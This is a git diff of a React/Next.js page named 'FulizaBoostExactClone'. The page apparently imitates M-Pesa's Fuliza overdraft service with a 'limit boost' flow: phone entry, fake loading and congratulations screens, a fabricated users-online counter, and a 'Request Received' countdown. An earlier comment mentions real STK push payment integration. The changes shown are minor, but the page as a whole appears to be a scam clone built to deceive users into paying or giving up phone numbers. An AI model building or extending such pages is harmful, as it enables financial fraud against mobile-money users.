@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Final Version with Real STK Push Integration
+// src/app/page.tsx - Final Version (No Phone Prefill)
 
 import React, { useState, useEffect } from 'react';
 
@@ -24,6 +24,7 @@ const limits = [
 export default function FulizaBoostExactClone() {
   const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
   const [usersOnline, setUsersOnline] = useState(137);
+  const [phoneNumber, setPhoneNumber] = useState(''); // No prefill
   const [enteredPhone, setEnteredPhone] = useState('');
   const [loadingMsg, setLoadingMsg] = useState('');
 
@@ -137,7 +138,7 @@ export default function FulizaBoostExactClone() {
   const closeProcessingModal = () => {
     setShowProcessingModal(false);
     setShowSuccessModal(true);
-    setCountdown(600); // Reset to 10 minutes
+    setCountdown(600);
   };
 
   const closeSuccessModal = () => {
@@ -162,7 +163,7 @@ export default function FulizaBoostExactClone() {
 
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
 
-          {/* Input Screen - unchanged */}
+          {/* Input Screen */}
           {step === 'input' && (
             <>
               <div className="pt-10 pb-6 flex flex-col items-center">
@@ -280,7 +281,7 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
-          {/* Final Screen */}
+          {/* Final Ksh 0 Screen */}
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
@@ -398,7 +399,6 @@ export default function FulizaBoostExactClone() {
               <h3 className="text-2xl font-semibold text-gray-900">Request Received</h3>
               <p className="text-gray-600 mt-1">Updating records. Please wait.</p>
 
-              {/* 10-Minute Countdown */}
               <div className="mt-8 bg-gray-100 rounded-2xl py-4 px-10 inline-block">
                 <span className="text-4xl font-mono font-semibold text-gray-800">
                   {formatCountdown()}
